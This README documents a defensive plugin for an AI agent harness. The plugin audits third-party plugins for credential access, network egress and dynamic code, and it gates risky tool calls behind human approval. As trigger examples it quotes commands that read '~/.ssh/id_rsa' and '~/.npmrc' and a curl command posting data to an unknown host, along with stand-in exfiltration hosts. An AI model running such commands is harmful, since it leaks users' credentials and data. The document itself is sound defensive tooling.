# dsh-plugin-audit

[中文](./README.zh.md) · [npm](https://www.npmjs.com/package/dsh-plugin-audit) · [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)

**Know what a DSH plugin can do before you let it run.** `dsh-plugin-audit` profiles third-party plugins statically — which files, processes, hosts, env vars and credential paths their code touches, with file/line evidence — and arms a runtime sentinel that asks for your approval when any tool call reaches for credentials or moves data to unknown hosts.

## What it does

**1. Static audit — the `plugin_audit` tool.** Point it at any plugin directory; it scans the source, `package.json` and `cordis.patch.yml`, then returns a permission profile card:

```markdown
## Plugin audit: fixture-suspicious-plugin

**Risk: REVIEW** — human review recommended before installing

> 1 files scanned; 10 findings (4 review, 4 notice, 2 info)

### Permission profile

| Surface | Observed |
|---|---|
| Filesystem read / write | **yes / yes** |
| Child processes | **yes** |
| Outbound hosts | `evil.example.com`, `exfil.badhost.io`, `telemetry.example.net` |
| Credential-looking env | `GITHUB_TOKEN` |
| Credential paths | `.npmrc`, `.ssh` |
| Dynamic code execution | **yes** |
| Injected services | `credentials`, `tools` |

### Findings

| severity | capability | location | detail |
|---|---|---|---|
| review | credential-access | `src/index.js:12` | References a credential-bearing path. |
| review | dynamic-exec | `src/index.js:23` | Evaluates dynamically constructed code. |
| notice | network | `src/index.js:19` | Calls the global fetch API. |
| … | … | … | … |
```

The scan is **read-only by contract**: every report carries `writesPerformed: false`, and an optional invariant companion enforces that marker at runtime.

**2. Runtime sentinel.** A listener on the harness's `tools/pre-execute` waterfall. When a pending tool call matches a risk rule, the sentinel returns `ask` with a reason, and the host's normal approval prompt takes it from there (no approval channel → the call is denied, never silently allowed):

| Rule | Example that triggers an approval prompt |
|---|---|
| Any tool argument references a credential path | `read` on `~/.ssh/id_rsa`, `bash: cat ~/.npmrc` |
| Shell egress toward a host outside `allowedHosts` | `curl -d @data.json https://collector.unknown.io/x` |
| A write tool targets a home-directory dotfile | `write` on `~/.zshrc` |

The audit is an aid, not a verdict — it surfaces evidence so *you* decide.

## Compatibility

| Requirement | Version |
| --- | --- |
| DSH mainline | verified against the 2026-08-14 snapshot (web + headless profiles) |
| Node.js | `^22.19.0 || >=24.0.0` |
| Cordis | `^4.0.0-rc.7` (peer) |

DSH is in developer preview and ships breaking changes frequently; the date above records the mainline snapshot this release was verified against. The `./invariant` companion is exported but intentionally **not** wired into `cordis.patch.yml`: stock profiles do not provide the `invariants` service, and a pending row blocks boot. Profiles that do provide it can add `{ id: dsh-plugin-audit-invariant, name: 'dsh-plugin-audit/invariant' }`.

## Install

```bash
# from npm
dsh plugin --profile web add dsh-plugin-audit

# or directly from GitHub
dsh plugin --profile web add github:jkrandom-sudo/dsh-plugin-audit
```

Either command registers the package in the profile's `dsh.profile.bundles` and applies this package's `cordis.patch.yml` (one row: `dsh-plugin-audit`, `sentinelEnabled: true`). Restart the profile to pick it up.

## Uninstall

```bash
dsh plugin --profile web remove dsh-plugin-audit
```

Removes the dependency and the bundle row; restart the profile. The plugin writes nothing outside the profile's own dependency metadata, so there is nothing else to clean up.

## Quick start

In a session on any profile where the plugin is installed, just ask:

```
Audit the plugin at ~/some-third-party-plugin with plugin_audit
```

or let the model call the tool directly:

```json
{ "path": "/absolute/path/to/plugin", "format": "markdown" }
```

- `path` (required) — the plugin's **source** directory (not an installed copy with `node_modules`).
- `format` — `markdown` (default) or `json`.

The tool returns the Markdown card above plus a JSON summary: `{ markdown, risk, filesScanned, findingsCount, writesPerformed }`.

The sentinel needs no invocation — once armed it watches every tool call in the session:

> ⚠ Tool "bash" runs curl toward "collector.unknown.io", which is not in allowedHosts. Outbound data movement needs your confirmation. *(approve / deny)*

## Configuration

The bundle patch inserts one row into the profile; edit it in the profile's `cordis.patch.yml`:

```yaml
- id: dsh-plugin-audit
  name: 'dsh-plugin-audit'
  config:
    sentinelEnabled: true        # master switch; false = static audit only
    allowedHosts:                # pre-approved hosts for shell egress
      - github.com
      - api.github.com
      - raw.githubusercontent.com
      - registry.npmjs.org
      - '*.deepseek.com'         # leading *. = suffix rule (also matches the bare domain)
```

The static scanner takes no configuration and ignores `allowedHosts` — it reports every network surface it finds.

## Permissions & data

- **Read-only scanner** — read handles only, capped at 400 files / 256 KB per file, skipping `node_modules`, `.git`, `lib`, `dist`. The optional `dsh-plugin-audit/invariant` companion fails the session if a `plugin_audit` result ever loses its `writesPerformed: false` marker.
- **No network, no telemetry** — the plugin makes no network calls of its own. Hosts listed in a report are extracted from scanned source text, never contacted.
- **Local decisions** — `ask` verdicts are mediated by the host's existing approval prompt; the plugin only logs the reason via `ctx.logger`.
- **Sentinel scope** — it inspects the name and arguments of calls passing through `tools/pre-execute`; it does not read files, env vars, or conversation content beyond the call arguments themselves.

## Troubleshooting

- **`dsh-plugin-audit/invariant: pending (waiting for service: invariants)` at boot** — you wired the invariant row into a profile without the `invariants` service; remove that row (the shipped patch already omits it).
- **The agent can't see `plugin_audit`** — check the package is in the profile's `package.json` `dsh.profile.bundles` and that `--dump-config` shows the `dsh-plugin-audit` row, then restart.
- **Legitimate commands keep asking** — add the host to `allowedHosts`, or set `sentinelEnabled: false` to keep only the static auditor.
- **Fewer files scanned than expected** — the walker caps at 400 files / 256 KB and skips build output; audit the package source, not an installed copy.

## Development

```bash
pnpm install
pnpm typecheck   # both tsconfigs
pnpm test        # vitest: scanner, sentinel rules, plugin lifecycle, invariant
pnpm build       # tsc -b && tsdown -> lib/
```

Layout: `src/scanner/` is a harness-agnostic pure engine (walk → detect → manifest → report), `src/report.ts` renders the Markdown card, `src/runtime.ts` adapts it to the Cordis/DSH tool contract, `src/sentinel/` holds the pure decision rules and the waterfall listener, `src/invariant.ts` is the read-only enforcement companion. `tests/fixtures/` contains sample plugins (suspicious / clean / patch-override) used by the test suite.

## License & security

MIT — see [LICENSE](./LICENSE).

This plugin is an audit aid, not an antivirus: a clean report means "no evidence found by these rules", not "safe". Findings are heuristics with file/line evidence so a human can judge. Found a bypass — a capability the scanner misses, a sentinel rule that can be dodged? Open an issue at <https://github.com/jkrandom-sudo/dsh-plugin-audit/issues>, or report privately first for anything sensitive.
